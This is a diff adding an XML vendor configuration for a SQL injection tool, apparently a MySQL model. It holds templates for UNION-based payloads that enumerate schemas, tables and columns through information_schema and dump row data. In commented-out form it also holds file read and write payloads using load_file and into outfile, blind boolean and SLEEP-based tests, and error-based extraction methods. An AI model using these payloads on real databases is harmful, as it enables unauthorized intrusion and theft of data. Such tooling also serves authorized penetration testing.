@@ -1,0 +1,439 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+concat(
+    concat_ws(
+        '${ENCLOSE_VALUE_SQL}',
+        version(),
+        database(),
+        user()
+    ),
+    '${TRAIL_SQL}'
+)
+        </info>
+        <schema>
+            <database>
+select concat(
+    ifnull(
+        group_concat(
+            '${ENCLOSE_VALUE_SQL}',
+            r,
+            '${SEPARATOR_QTE_SQL}',
+            q,
+            '${ENCLOSE_VALUE_SQL}'
+            separator '${SEPARATOR_CELL_SQL}'
+        ),
+        '${TRAIL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(SCHEMA_NAME as char) r,
+        cast(count(TABLE_NAME) as char) q
+    from INFORMATION_SCHEMA.tables t
+    right join INFORMATION_SCHEMA.schemata s
+    on s.SCHEMA_NAME = t.table_schema
+    group by r
+    {limit}
+) x
+            </database>
+            <table>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}',
+        r,
+        '${SEPARATOR_QTE_SQL}',
+        q,
+        '${ENCLOSE_VALUE_SQL}'
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(TABLE_NAME as char) r,
+        cast(ifnull(table_rows, '0') as char) q
+    from information_schema.tables
+    where TABLE_SCHEMA = '${DATABASE}'
+    order by r
+    {limit}
+) x
+            </table>
+            <column>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}',
+        n,
+        '${SEPARATOR_QTE_SQL}',
+        0,
+        '${ENCLOSE_VALUE_SQL}'
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select cast(COLUMN_NAME as char) n
+    from information_schema.columns
+    where TABLE_SCHEMA = '${DATABASE}'
+    and TABLE_NAME = '${TABLE}'
+    order by n
+    {limit}
+) x
+            </column>
+            <row>
+                <query>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}',
+        r,
+        '${SEPARATOR_QTE_SQL}',
+        q,
+        '${ENCLOSE_VALUE_SQL}'
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(concat(${FIELDS}) as char) r,
+        cast(count(*) as char) q
+    from `${DATABASE}`.`${TABLE}`
+    group by r
+    {limit}
+) x
+                </query>
+                <fields>
+                    <field>trim(ifnull(`${FIELD}`, ''))</field>
+                    <concat>,0x7f,</concat>
+                </fields>
+            </row>
+        </schema>
+<!--         <file> -->
+<!--             <privilege> -->
+<!-- cast( -->
+<!--     concat( -->
+<!--         ( -->
+<!--             select if(count(*) = 1, 0x74727565, 0x66616c7365) -->
+<!--             from INFORMATION_SCHEMA.USER_PRIVILEGES -->
+<!--             where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27) -->
+<!--             and PRIVILEGE_TYPE = 0x46494c45 -->
+<!--         ), -->
+<!--         '${TRAIL_SQL}' -->
+<!--     ) -->
+<!--     as char -->
+<!-- ) -->
+<!--             </privilege> -->
+<!--             <read>cast(concat(load_file(0x${FILEPATH.HEX}), '${TRAIL_SQL}') as char)</read> -->
+<!--             <create> -->
+<!--                 <content>(select 0x${CONTENT.HEX})</content> -->
+<!--                 <query>into outfile "${FILEPATH}"</query> -->
+<!--             </create> -->
+<!--         </file> -->
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+concat(
+    '${LEAD}',
+    substr(
+        (${INJECTION}),
+        ${INDEX},
+        ${CAPACITY}
+    )
+)
+            </slidingWindow>
+            <limit>limit ${LIMIT}, 65536</limit>
+            <failsafe>1337${INDICE}7330%2b1</failsafe>
+            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')</calibrator>
+            <limitBoundary>0</limitBoundary>
+        </configuration>
+        <normal>
+            <indices>union select ${INDICES}</indices>
+            <capacity>
+(
+    select concat(
+        '${LEAD}', 
+        ${INDICE}, 
+        ${CALIBRATOR}
+    )
+)
+            </capacity>
+            <orderBy>order by 1337</orderBy>
+        </normal>
+<!--         <boolean> -->
+<!--             <test> -->
+<!--                 <false>true = false</false> -->
+<!--                 <false>true %21= true</false> -->
+<!--                 <false>false %21= false</false> -->
+<!--                 <false>1 = 2</false> -->
+<!--                 <false>1 %21= 1</false> -->
+<!--                 <false>2 %21= 2</false> -->
+<!--                 <true>true = true</true> -->
+<!--                 <true>false = false</true> -->
+<!--                 <true>true %21= false</true> -->
+<!--                 <true>1 = 1</true> -->
+<!--                 <true>2 = 2</true> -->
+<!--                 <true>1 %21= 2</true> -->
+<!--                 <initialization>0%2b1 = 1</initialization> -->
+<!--                 <bit> -->
+<!-- ascii( -->
+<!--     substring( -->
+<!--         ${INJECTION},  -->
+<!--         ${INDEX},  -->
+<!--         1 -->
+<!--     ) -->
+<!-- )  -->
+<!-- %26 ${BIT} -->
+<!--                 </bit> -->
+<!--                 <length>char_length(${INJECTION}) > ${INDEX}</length> -->
+<!--             </test> -->
+<!--             <blind>and ${TEST}</blind> -->
+<!--             <time> -->
+<!-- and if( -->
+<!--     ${TEST},  -->
+<!--     1,  -->
+<!--     SLEEP(${SLEEP_TIME}) -->
+<!-- ) -->
+<!--             </time> -->
+<!--         </boolean> -->
+<!--         <error> -->
+<!--             <method> -->
+<!--                 <name>BIGINT::exp</name> -->
+<!--                 <query> -->
+<!-- and !( -->
+<!--     select *  -->
+<!--     from ( -->
+<!--         ${WINDOW} -->
+<!--     ) x -->
+<!-- )-~0 -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>BIGINT::exp in Order By</name> -->
+<!--                 <query> -->
+<!-- 1, ( -->
+<!--     select 1  -->
+<!--     from ( -->
+<!--         select !( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         )-~0 -->
+<!--     ) x -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>BIGINT::exp in Delete Update Insert</name> -->
+<!--                 <query> -->
+<!-- ' or ( -->
+<!--     select !( -->
+<!--         select *  -->
+<!--         from ( -->
+<!--             ${WINDOW} -->
+<!--         ) x -->
+<!--     )-~0 -->
+<!-- ) or ' -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>DOUBLE::exp</name> -->
+<!--                 <query> -->
+<!-- and 1 = exp( -->
+<!--     ~( -->
+<!--         select *  -->
+<!--         from ( -->
+<!--             ${WINDOW} -->
+<!--         ) x -->
+<!--     ) -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>DOUBLE::exp in Order By</name> -->
+<!--                 <query> -->
+<!-- 1, ( -->
+<!--     select exp( -->
+<!--         ~( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         ) -->
+<!--     ) -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>DOUBLE::exp in Delete Update Insert</name> -->
+<!--                 <query> -->
+<!-- ' or ( -->
+<!--     select exp( -->
+<!--         ~( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         ) -->
+<!--     ) -->
+<!-- ) or ' -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>GROUPBY::floor_rand</name> -->
+<!--                 <query> -->
+<!-- or exists( -->
+<!--     select -->
+<!--         count(*), -->
+<!--         concat( -->
+<!--             (${WINDOW}), -->
+<!--             floor(rand(0)*2) -->
+<!--         ) -->
+<!--     from information_schema.tables -->
+<!--     group by 2 -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>GROUPBY::floor_rand in Order By</name> -->
+<!--                 <query> -->
+<!-- 1, ( -->
+<!--     select 1 from ( -->
+<!--         select -->
+<!--             count(*), -->
+<!--             concat( -->
+<!--                 (${WINDOW}), -->
+<!--                 floor(rand(0)*2) -->
+<!--             ) -->
+<!--         from information_schema.tables -->
+<!--         group by 2 -->
+<!--     ) x -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>GROUPBY::floor_rand in Delete Insert Update</name> -->
+<!--                 <query> -->
+<!-- ' or ( -->
+<!--     select 1 from ( -->
+<!--         select -->
+<!--             count(*), -->
+<!--             concat( -->
+<!--                 (${WINDOW}), -->
+<!--                 floor(rand(0)*2) -->
+<!--             ) -->
+<!--         from information_schema.tables -->
+<!--         group by 2 -->
+<!--     ) x -->
+<!-- ) or ' -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>JSON::json_keys</name> -->
+<!--                 <query> -->
+<!-- /* Require FALSE statement, then OR */ -->
+<!-- and 1 = 0 or 1 = ( -->
+<!--     select JSON_KEYS ( -->
+<!--         ( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         ) -->
+<!--     ) -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>JSON::json_keys in Order By</name> -->
+<!--                 <query> -->
+<!-- /* Require FALSE statement, then OR */ -->
+<!-- 1, ( -->
+<!--     select JSON_KEYS ( -->
+<!--         ( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         ) -->
+<!--     ) -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>JSON::json_keys in Delete Insert Update</name> -->
+<!--                 <query> -->
+<!-- ' or ( -->
+<!--     select JSON_KEYS ( -->
+<!--         ( -->
+<!--             select *  -->
+<!--             from ( -->
+<!--                 ${WINDOW} -->
+<!--             ) x -->
+<!--         ) -->
+<!--     ) -->
+<!-- ) or ' -->
+<!--                 </query> -->
+<!--                 <capacity>64</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>XML::extractvalue</name> -->
+<!--                 <query> -->
+<!-- and 1 = extractvalue( -->
+<!--     0x0a,  -->
+<!--     concat( -->
+<!--         0x0a, -->
+<!--         (${WINDOW}) -->
+<!--     ) -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>99</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>XML::extractvalue in Order By</name> -->
+<!--                 <query> -->
+<!-- 1, ( -->
+<!--     select 1 from ( -->
+<!--         select extractvalue( -->
+<!--             0x0a,  -->
+<!--             concat( -->
+<!--                 0x0a,  -->
+<!--                 (${WINDOW}) -->
+<!--             ) -->
+<!--         ) -->
+<!--     ) x -->
+<!-- ) -->
+<!--                 </query> -->
+<!--                 <capacity>99</capacity> -->
+<!--             </method> -->
+<!--             <method> -->
+<!--                 <name>XML::extractvalue in Delete Insert Update</name> -->
+<!--                 <query> -->
+<!-- ' or ( -->
+<!--     select 1 from ( -->
+<!--         select extractvalue( -->
+<!--             0x0a,  -->
+<!--             concat( -->
+<!--                 0x0a,  -->
+<!--                 (${WINDOW}) -->
+<!--             ) -->
+<!--         ) -->
+<!--     ) x -->
+<!-- ) or ' -->
+<!--                 </query> -->
+<!--                 <capacity>99</capacity> -->
+<!--             </method> -->
+<!--         </error> -->
+    </strategy>
+</model>
